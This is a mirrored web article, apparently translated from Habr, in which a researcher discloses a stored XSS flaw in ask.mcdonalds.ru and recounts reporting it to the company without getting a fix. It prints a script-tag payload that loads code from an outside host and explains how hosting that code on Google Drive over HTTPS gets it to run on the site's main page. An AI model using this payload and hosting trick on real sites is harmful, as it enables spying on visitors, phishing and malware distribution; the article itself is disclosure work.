<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Defice ask.mcdonalds.ru</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="All information is provided for informational purposes only. I am not responsible for any possible harm caused by the materials of this article. 
 It ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Defice ask.mcdonalds.ru</h1><div class="post__text post__text-html js-mediator-article"><hr>  All information is provided for informational purposes only.  I am not responsible for any possible harm caused by the materials of this article. <hr><br>  It all started when, on a typical May day, I stumbled upon the VKontakte community, which published funny questions from people about McDonald‚Äôs products, which they asked on a certain website.  It looked like this: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/web/9f6/b64/0bf/9f6b640bf1454d668421e3b758b44064.png"></div><br>  Having looked through the wall, I became interested and decided to see what this platform is for communicating with users - <a href="https://ask.mcdonalds.ru/">ask.mcdonalds.ru</a> . <br><a name="habracut"></a><br><blockquote>  Short excursion: <br><br>  According to the information published by them, <i>‚ÄúThe site is designed to answer in as much detail as possible the questions that our guests most often have: about the composition, safety and quality of McDonald‚Äôs products - from field to counter.</i>  <i>Therefore, within the framework of the Site, we answer questions that are directly related to McDonald's products. ‚Äù</i> </blockquote><br>  I am really glad, from the point of view of the client, it's great when I can ask a question about the product and get an adequate answer to it. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h3>  Vulnerability Detection </h3><br>  Next, I decided to register and in passing checked how the characters transmitted through the registration form were screened.  What was my surprise when I saw that on the page in the end everything is displayed <b>"as is"</b> .  A simple example: <br><br><img src="https://habrastorage.org/web/d08/dca/819/d08dca8197b0424d9347fd97324975f7.png"><br><br>  Thus, we immediately see the presence of <b>Stored XSS</b> , which can be used by anyone who wishes, since it is very easy to detect (by the way, well, besides, the site also has the notorious <b>logout CSRF</b> ). <br><br>  That is, we, along with the usual at first glance, name and surname, also transmit by means of the form something like <br><br><pre><code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">http://site.com/AnyDangerousScript.js</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="hljs-tag"><span class="undefined"></span><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  and we get the ability to perform any of our script <b>on the main page of the site</b> when performing further simple actions, but first things first. <br><br>  I decided to check the vulnerability again: <br><br><img src="https://habrastorage.org/web/a35/bdd/54d/a35bdd54d4714fbc93bcec8fce4ebf17.png"><br><br><div class="spoiler">  <b class="spoiler_title">Interesting fact</b> <div class="spoiler_text">  If you suddenly want to read the same ‚Äúprovision on the processing and protection of personal data,‚Äù then you, alas, cannot do this, because 404 is waiting for us at <a href="http://mcdonalds.ru/legacy">mcdonalds.ru/legacy</a> and this <br><br><img src="https://habrastorage.org/getpro/habr/post_images/563/cf5/202/563cf5202d9d8423330c38c5af8556a3.jpg" alt="image"><br></div></div><br>  But this time the code failed.  Opening the console, I saw the following: <br><br><img src="https://habrastorage.org/web/929/29e/c74/92929ec747b74a86b696074afde40d75.png"><br><br>  In this case, the page is transferred via the <b>HTTPS protocol</b> , but also contains the content transmitted via normal, open <b>HTTP</b> (my script).  Then the connection is considered partially encrypted, and the page itself is called a <u><b>page with mixed content</b></u> . <br><br>  That is, it is important here that the script is also transmitted via <b>HTTPS</b> . <br><br>  I wondered where it would be easiest to place the script file in this case and remembered <b>Google Drive</b> .  And the cloud storage from Google will come to the rescue here, and I will receive the necessary file without any problems using a secure protocol. <br><br>  Any file stored on your Google Drive can be directly accessible via a direct link.  Getting it is not at all difficult: <br>  Make the file available by reference and get something like <blockquote> <code>https://drive.google.com/file/d/AAAAAAAAAAAAAAAAAAA/view?usp=sharing</code> </blockquote> <br>  then take the value after drive.google.com/file/d/, in our case ‚ÄúAAAAAAAAAAAAAAAAAAA‚Äù, and substitute it as the value of the id parameter in the link like <br><blockquote> <code>https://drive.google.com/uc?export=download&amp;id=</code> </blockquote> <br>  That's all, now it‚Äôs enough for us to register an account whose name will contain our code, then ask any simple question, wait until it is answered and it will be posted on the main page. <br><br><img src="https://habrastorage.org/web/46b/ad8/ed2/46bad8ed255648a7b9b69ecc8376b3c9.png"><br><br>  That is, we get the opportunity to execute <b>any</b> code on the main page of the site. <br><br><img src="https://habrastorage.org/web/7b8/96d/75e/7b896d75ea6e487e8bbd397bb2e79208.png"><br><br><h3>  Implications of having such a vulnerability </h3><br>  I think it would be superfluous to talk about what <b>McDonald‚Äôs</b> is.  For such a large company, the presence of such a vulnerability, or rather the exploitation of it by attackers, can lead to serious economic damage. <br><br>  Since this is a stored vulnerability, it introduces its own (possibly malicious) code to the server, which is executed each time the user accesses the original page. <br><br>  And if you imagine, the mass use options: <br><br><ul><li>  <b>spying on visitors</b> </li><li>  <b>phishing</b> </li><li>  <b>add your advertising affiliate programs to the site</b> </li><li>  <b>malware distribution</b> </li><li>  <b>and much more.</b> </li></ul><br>  And if such vulnerability fell into the hands of their <b>competitors</b> in the market?  Here you can act even more interesting, because in this way there is full access to the entire content of the page, they can also change the text of both questions and answers, forming fake questions and answers, exposing the whole company in a bad light, or even advertising their products, which will lead to the formation of a negative image, loss of customer loyalty and, in the long run, the loss of some customers in general.  Such use may not be noticeable at first glance and the detection might be delayed. <br>  And the <b>deface of the</b> site itself is dangerous, since the contents of the main page of the site, where most people go, can be changed. <br><br><h3>  Company Vulnerability Report and Outcome </h3><br>  After checking everything again and making sure that the vulnerability is stable and is not the result of my subjective interaction with the site, I decided to inform the company about its presence. <br><br>  I contacted various email addresses on the site, wrote to the official VKontakte and Facebook posts, they only answered Facebook, saying that I could send all the details directly to them, which I did.  Some time passed, but nothing was fixed, I once again wrote a reminder that the vulnerability is still present, but there was no answer.  At the moment, more than 2 months have passed since the moment all the details were reported, unfortunately, nothing has been fixed. <br><br>  I do not intend to exploit the vulnerability, therefore I hope that this article will also help to convey information to the company, and the vulnerability will be fixed. <br><br>  <b>Upd.</b> <br>  As such, the negative effect immediately after the publication of the article should not be, because before the publication one way or another, all questions are moderated, and time must pass, at least, until your question is answered. </div><p>Source: <a href="https://habr.com/ru/post/334564/">https://habr.com/ru/post/334564/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../334554/index.html">Characteristics of the PVS-Studio analyzer on the example of EFL Core Libraries, 10-15% of false positives</a></li>
<li><a href="../334556/index.html">Machine Learning for an Insurance Company: Improving the Model through Algorithm Optimization</a></li>
<li><a href="../334558/index.html">Differentiation of access rights in PostgreSQL</a></li>
<li><a href="../334560/index.html">Let's play in Firebase</a></li>
<li><a href="../334562/index.html">hh and in production: how to release a new feature</a></li>
<li><a href="../334566/index.html">7 ways to use blue in your company colors</a></li>
<li><a href="../334568/index.html">Generative models from OpenAI</a></li>
<li><a href="../334570/index.html">Upgrading traders' workplace infrastructure</a></li>
<li><a href="../334572/index.html">10 steps to set up the Create React App + TypeScript + Ant-Design</a></li>
<li><a href="../334574/index.html">How we created a fast event stream processing device on FPGA</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>